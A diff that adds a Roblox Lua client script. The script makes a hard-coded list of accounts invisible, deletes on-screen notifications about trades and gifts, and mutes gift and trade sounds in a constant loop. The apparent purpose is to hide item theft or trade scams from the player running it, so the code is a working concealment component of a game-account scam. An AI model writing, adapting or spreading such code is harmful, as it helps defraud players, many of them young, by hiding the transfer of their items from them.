@@ -1,0 +1,108 @@
+-- ⏳ Wait for the game to fully load
+repeat task.wait() until game:IsLoaded()
+
+-- 🔧 Services
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local SoundService = game:GetService("SoundService")
+
+-- 👻 List of players to make invisible
+local invisibleNames = {
+    ["FatalLoots"] = true,
+    ["FatalLoots2"] = true,
+    ["FatalLoots3"] = true,
+    ["FatalLoots4"] = true,
+    ["FatalLoots5"] = true,
+    ["GamerBoy903829"] = true,
+    ["Gieanneiloveyou"] = true
+}
+
+-- 🫥 Make all parts of a character invisible
+local function makeCharacterInvisible(character)
+    for _, item in ipairs(character:GetDescendants()) do
+        if item:IsA("BasePart") or item:IsA("Decal") then
+            item.Transparency = 1
+        elseif item:IsA("ParticleEmitter") or item:IsA("Beam") then
+            item.Enabled = false
+        end
+    end
+
+    local head = character:FindFirstChild("Head")
+    if head then
+        for _, obj in ipairs(head:GetChildren()) do
+            if obj:IsA("BillboardGui") then
+                obj:Destroy()
+            end
+        end
+    end
+end
+
+-- 👤 Monitor a player and apply invisibility if needed
+local function monitorPlayer(player)
+    if invisibleNames[player.Name] then
+        if player.Character then
+            makeCharacterInvisible(player.Character)
+        end
+        player.CharacterAdded:Connect(function(char)
+            task.wait(0.5)
+            makeCharacterInvisible(char)
+        end)
+    end
+end
+
+-- 🚫 Phrases to remove from notifications
+local blockedMessages = {
+    "Your trade is processing",
+    "Trade complete!",
+    "Sent gift request!",
+    "You have received a gift",
+    "Gift accepted",
+    "You have received a trade",
+    "Gift sent successfully",
+    "Someone sent you a gift"
+}
+
+-- ❌ Remove GUI notifications with blocked phrases
+local function removeBlockedNotifications()
+    for _, guiElement in ipairs(CoreGui:GetDescendants()) do
+        if guiElement:IsA("TextLabel") or guiElement:IsA("TextBox") then
+            for _, phrase in ipairs(blockedMessages) do
+                if guiElement.Text and guiElement.Text:lower():find(phrase:lower()) then
+                    local container = guiElement:FindFirstAncestorWhichIsA("Frame") or guiElement
+                    if container and container:IsDescendantOf(CoreGui) then
+                        container:Destroy()
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- 🔇 Mute any sounds related to gifts or trades
+local function muteGiftAndTradeSounds()
+    for _, sound in ipairs(SoundService:GetDescendants()) do
+        if sound:IsA("Sound") then
+            local name = sound.Name:lower()
+            if name:find("gift") or name:find("trade") then
+                sound:Stop()
+                sound.Volume = 0
+            end
+        end
+    end
+end
+
+-- 🔁 Continuous cleanup loop
+task.spawn(function()
+    while true do
+        removeBlockedNotifications()
+        muteGiftAndTradeSounds()
+        task.wait(0.5)
+    end
+end)
+
+-- 👥 Apply invisibility logic to current and new players
+for _, player in ipairs(Players:GetPlayers()) do
+    monitorPlayer(player)
+end
+
+Players.PlayerAdded:Connect(monitorPlayer)
